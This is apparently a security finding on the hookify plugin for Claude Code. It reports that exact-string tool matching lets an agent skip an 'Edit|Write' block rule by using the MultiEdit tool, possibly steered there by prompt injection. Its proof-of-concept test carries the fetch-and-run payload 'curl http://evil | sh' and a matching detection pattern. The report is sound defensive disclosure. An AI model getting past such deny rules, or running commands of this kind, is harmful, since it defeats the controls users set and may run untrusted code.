### Title
Hookify `RuleEngine._matches_tool` exact-string matching lets equivalent write/edit tools bypass a block rule - (File: plugins/hookify/core/rule_engine.py)

### Summary
`RuleEngine._matches_tool` performs a strict, literal string match of `tool_name` against the pipe-separated list configured in a rule's `tool_matcher` (e.g. `"Edit|Write"`), with no notion that `MultiEdit` (and other tool aliases that produce the same file-mutation effect) is functionally equivalent to `Edit`/`Write`. Because `_check_condition`/`_extract_field` already implement content-extraction logic for `MultiEdit` as a first-class case, but `_matches_tool` does not automatically include it when a rule targets `Edit|Write`, a block rule written to stop dangerous edits can be silently skipped simply by having the agent perform the same mutation through the `MultiEdit` tool instead of `Edit`/`Write`.

### Finding Description
`RuleEngine.evaluate_rules` → `_rule_matches` first checks `rule.tool_matcher` via `_matches_tool`, and only evaluates `_check_condition` for tools that pass this gate: [1](#0-0) .

`_matches_tool` implements matching purely as an exact membership test against the `|`-split list, with a wildcard `*` special case, but no canonicalization of semantically-equivalent tool names: [2](#0-1) .

Meanwhile, `_extract_field` explicitly special-cases `MultiEdit` as a distinct tool that can carry the same dangerous `file_path`/`new_text`/`content` payloads that `Edit`/`Write` carry: [3](#0-2) . This shows the engine's authors recognized `MultiEdit` as an equivalent write vector for condition evaluation, but the tool-matcher gate in `_matches_tool` was not updated to automatically fold `MultiEdit` into an `Edit|Write` matcher (or vice versa) — it only matches whatever literal tokens the rule author typed.

Exploit flow: a rule such as
```
tool_matcher: "Edit|Write"
conditions:
  - field: new_text
    operator: regex_match
    pattern: "dangerous-pattern"
action: block
```
is intended to deny any dangerous edit/write. If the same dangerous content is introduced via the `MultiEdit` tool (which Claude Code offers as a normal, first-class tool for making edits, and which an attacker-influenced prompt or repository content could induce the agent to prefer), `_matches_tool("Edit|Write", "MultiEdit")` returns `False` at line 142, so `_rule_matches` short-circuits at line 113 and the block condition is never evaluated at all — the dangerous content passes straight through PreToolUse/PostToolUse enforcement.

### Impact Explanation
This breaks the stated invariant "a matching block rule must reliably deny the protected operation." An attacker who can steer the assistant's tool choice (e.g., via prompt injection embedded in repository content, issue/PR text, or other untrusted context ingested by Claude Code) can achieve the exact same file mutation that a hookify block rule was designed to prevent, simply by causing `MultiEdit` to be used instead of `Edit`/`Write`. This is an unauthorized, policy-bypassing local file-write path that defeats the deny control the plugin's user configured, matching the "Unauthorized local command execution/file mutation that bypasses Claude Code approval or deny controls" impact class.

### Likelihood Explanation
Preconditions: (1) the victim has deployed a hookify block rule scoped with a `tool_matcher` that lists specific tool names (e.g. `Edit|Write`) rather than `*`, and (2) the attacker can influence the assistant to perform the equivalent mutation via a different, unlisted tool name (`MultiEdit`) that is a normal, always-available Claude Code tool. Both conditions are realistic: hookify's own documentation/skill files reference `MultiEdit` as a distinct tool needing separate handling, and many rule examples target specific tool names rather than `*` for precision. Prompt-injection-driven tool selection is a well-established class of attack in agentic coding tools. The bypass is deterministic and repeatable once these preconditions hold — it does not depend on race conditions or timing.

### Recommendation
Normalize tool matching so that functionally equivalent tools are treated as one family, e.g., maintain a canonical mapping (`Edit`/`Write`/`MultiEdit`/`NotebookEdit` → "file_write" family; similarly for any Bash-equivalent execution tools) and expand a rule's `tool_matcher` against that family before doing the literal `in patterns` check, or require condition fields (`file_path`, `new_text`, `content`) to be checked independent of `tool_matcher` when the field is present, rather than gating strictly by tool name. At minimum, `_matches_tool` should document and enforce that `Edit|Write` implicitly includes `MultiEdit`, since `_extract_field` already treats them as equivalent for content extraction.

### Proof of Concept
Unit test in `plugins/hookify/core/rule_engine.py`'s test harness style:
```python
rule = Rule(
    name="block-dangerous-edit",
    enabled=True,
    event="file",
    tool_matcher="Edit|Write",
    conditions=[Condition(field="new_text", operator="regex_match", pattern="curl .* \| sh")],
    action="block",
    message="Dangerous content blocked",
)
engine = RuleEngine()

# Baseline: Edit tool is correctly blocked
edit_input = {"tool_name": "Edit", "tool_input": {"file_path": "x.sh", "new_string": "curl http://evil | sh"}}
assert engine.evaluate_rules([rule], edit_input).get("hookSpecificOutput", {}).get("permissionDecision") == "deny"

# Bypass: identical payload via MultiEdit is NOT blocked
multiedit_input = {
    "tool_name": "MultiEdit",
    "tool_input": {"file_path": "x.sh", "edits": [{"new_string": "curl http://evil | sh"}]},
}
result = engine.evaluate_rules([rule], multiedit_input)
assert result == {}  # expected to fail: rule should have denied but does not
```
Expected (buggy) result: the `MultiEdit` case returns `{}` (allowed) despite carrying the exact same dangerous `new_text` content that the `Edit` case correctly blocks, confirming the tool-matcher bypass.

```python
    def _matches_tool(self, matcher: str, tool_name: str) -> bool:
        """Check if tool_name matches the matcher pattern.

        Args:
            matcher: Pattern like "Bash", "Edit|Write", "*"
            tool_name: Actual tool name

        Returns:
            True if matches
        """
        if matcher == '*':
            return True

        # Split on | for OR matching
        patterns = matcher.split('|')
        return tool_name in patterns
```
